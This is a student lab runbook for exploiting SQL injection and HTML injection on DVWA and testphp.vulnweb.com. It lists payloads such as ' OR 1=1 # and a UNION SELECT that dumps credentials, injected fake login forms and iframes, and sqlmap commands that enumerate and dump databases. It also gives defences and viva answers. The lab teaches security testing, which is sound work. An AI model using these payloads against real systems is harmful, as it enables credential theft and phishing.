# RUNBOOK — Experiment 08 (SQLi & HTML Injection)

**Aim:** To perform SQL Injection and HTML Injection against vulnerable web applications.

**Tools:** DVWA, Apache, MariaDB, PHP, sqlmap, Kali Linux.
**Targets:** `http://localhost/DVWA` and `http://testphp.vulnweb.com`.

---

## 1. Procedure

### 1.1 Install the stack + DVWA
```bash
git clone https://github.com/kushalborse29/Tcet2025.git
cd Tcet2025/dvwa-lab
sudo bash setup_dvwa.sh
```

### 1.2 Prepare DVWA
1. `http://localhost/DVWA/setup.php` → **Create / Reset Database**
2. `http://localhost/DVWA/login.php` → `admin` / `password`
3. **DVWA Security** → **Low** → Submit

### 1.3 LO1 — HTML Injection
1. Open **XSS (Reflected)**.
2. Submit `A` → observe "Hello A" (reflection).
3. Submit `<h1>test</h1>` → rendered as heading.
4. Submit `<marquee>`, `<img>`, `<a>`, `<iframe>`, fake `<form>`.
5. Screenshot each result.

### 1.4 LO2 — SQL Injection (manual)
1. Open **SQL Injection**.
2. Submit `1` → one record.
3. Submit `1'` → syntax error (injectable).
4. Submit `' OR 1=1 #` → all records.
5. Submit `' UNION SELECT user, password FROM users #` → credentials table.

### 1.5 LO2 — SQL Injection (sqlmap)
```bash
bash sqlmap_lab.sh web            # remote: testphp.vulnweb.com
bash sqlmap_lab.sh dvwa <PHPSESSID>
```

Outputs are saved to `~/dvwa_lab_output/`.

---

## 2. Observation table — HTML Injection

| # | Payload | Result observed | Inference |
|---|---|---|---|
| 1 | `A` | "Hello A" printed | Input reflected |
| 2 | `<h1>test</h1>` | "test" shown as heading | HTML parsed, not escaped |
| 3 | `<marquee>Hacked</marquee>` | Scrolling text | Arbitrary markup accepted |
| 4 | `<img src="...">` | Remote image displayed | External content can be embedded |
| 5 | `<form ...>` | Fake login form rendered | Credential phishing possible |
| 6 | `<iframe src="...">` | Third-party page embedded | Clickjacking / content spoofing |

---

## 3. Observation table — SQL Injection

| # | Payload / Command | Result | Inference |
|---|---|---|---|
| 1 | `1` | Single record | Normal behaviour |
| 2 | `1'` | SQL syntax error | Parameter is injectable |
| 3 | `' OR 1=1 #` | All users returned | Logic bypass, auth bypass possible |
| 4 | `' UNION SELECT user, password FROM users #` | DVWA user table dumped | Arbitrary data extraction |
| 5 | `sqlmap ... --dbs` | `acuart`, `information_schema` | DB enumeration |
| 6 | `sqlmap ... -D acuart --tables` | users, products, carts, … | Schema disclosure |
| 7 | `sqlmap ... -T users --columns` | uname, pass, email, cc | Column disclosure |
| 8 | `sqlmap ... --dump` | Credentials in plaintext | Full data compromise |

---

## 4. Inference (write this in the report)

- Both vulnerabilities have the **same root cause**: untrusted input used without
  validation/encoding.
- HTML injection lets an attacker **alter the page** shown to other users (defacement,
  fake login forms, embedded iframes) → phishing.
- SQL injection lets an attacker **read/modify the database**, bypass authentication and
  extract credentials. `acuart.users` stored passwords in **plaintext**, which is a second,
  independent weakness.
- DVWA at *Low* security applies **no filtering**, which is why the payloads pass straight
  through.

---

## 5. Conclusion

> In this experiment DVWA was deployed on a LAMP stack (Apache, MariaDB, PHP) and two
> web-application vulnerabilities were exploited. **HTML injection** was demonstrated on the
> reflected input page: payloads such as `<h1>`, `<marquee>`, `<img>` and a fabricated login
> `<form>` were rendered by the browser because the application failed to encode user output,
> enabling defacement and credential phishing. **SQL injection** was demonstrated manually —
> `1'` produced a syntax error, `' OR 1=1 #` returned every record and
> `' UNION SELECT user, password FROM users #` dumped the credentials table — and then
> automatically with **sqlmap**, which enumerated the `acuart` database, its tables and
> columns, and dumped the `users` table containing plaintext passwords. The experiment shows
> that both attacks stem from unvalidated input and are prevented by **prepared statements**,
> **output encoding**, least-privilege database accounts and a web application firewall.

---

## 6. Viva questions

| Question | Answer |
|---|---|
| What is DVWA? | Damn Vulnerable Web Application — deliberately insecure PHP/MySQL app for legal practice |
| What is LAMP? | Linux + Apache + MySQL/MariaDB + PHP |
| Default DVWA credentials? | `admin` / `password` |
| Why set security to Low? | Higher levels add filtering; Low shows the raw vulnerability |
| Which file holds DB credentials? | `config/config.inc.php` |
| Why chown www-data? | Apache runs as `www-data` and must read/own the app files |
| Web root on Debian/Ubuntu? | `/var/www/html` |
| Default ports? | Apache 80, MariaDB 3306 |
| What is HTML injection? | Injecting HTML tags via unvalidated input so the browser renders attacker content |
| HTML injection vs XSS? | HTML injection = markup; XSS = JavaScript execution. Same root cause |
| How to prevent HTML injection? | Output encoding, input validation, CSP, HttpOnly cookies |
| What is SQL injection? | Injecting SQL through input so the attacker controls the query |
| Types of SQLi? | In-band (error/UNION), blind (boolean, time-based), out-of-band |
| What did `1'` prove? | The quote broke the string literal → error → injectable |
| Why does `' OR 1=1 #` work? | Condition always true; `#` comments out the rest of the query |
| What does `UNION SELECT` require? | Same number of columns / compatible data types |
| What is sqlmap? | Automated SQLi detection and exploitation tool |
| `--dbs` / `--tables` / `--columns` / `--dump`? | databases / tables / columns / rows |
| What does `--batch` do? | Auto-answers prompts (non-interactive) |
| Why `--cookie` for DVWA? | DVWA needs a valid session; otherwise requests redirect to login |
| Why `testphp.vulnweb.com`? | Acunetix's intentionally vulnerable site — legal target |
| Database dumped? | `acuart` → table `users` → plaintext credentials |
| How to prevent SQLi? | Prepared/parameterised statements, validation, least privilege, WAF, no verbose errors |
| Is this legal? | Yes on DVWA/vulnweb; attacking real systems without permission is a crime |

---

## 7. Screenshots checklist

- [ ] `http://localhost` Apache page
- [ ] `setup.php` with green database row
- [ ] Login page (`admin`/`password`)
- [ ] DVWA Security = Low
- [ ] `<h1>test</h1>` rendered
- [ ] `<marquee>` / `<img>` / fake form
- [ ] `' OR 1=1 #` → all users
- [ ] `' UNION SELECT user, password FROM users #`
- [ ] sqlmap `--dbs`
- [ ] sqlmap `--tables`
- [ ] sqlmap `--columns`
- [ ] sqlmap `--dump`
